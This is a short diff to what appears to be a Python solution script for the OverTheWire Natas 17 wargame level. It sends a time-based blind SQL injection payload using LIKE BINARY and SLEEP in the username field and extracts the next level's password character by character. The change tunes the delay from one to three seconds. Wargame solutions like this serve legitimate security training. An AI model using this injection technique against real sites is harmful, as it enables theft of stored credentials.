@@ -11,13 +11,13 @@ url = 'http://natas17.natas.labs.overthewire.org/index.php'
 for i in range(0, 32):
     for char in passwd_dict:
         params = {
-            'username': 'natas18" and password LIKE BINARY "{}{}%" and SLEEP(1) -- ;'.format(passwd, char),
+            'username': 'natas18" and password LIKE BINARY "{}{}%" and SLEEP(3) -- ;'.format(passwd, char),
             'debug'   : True
         }
         r = requests.get(url, params=params, auth=(auth_username,auth_password))
         elps = r.elapsed.total_seconds()
 
-        if elps > 1:
+        if elps > 3:
             passwd += char
             print(passwd)
             break
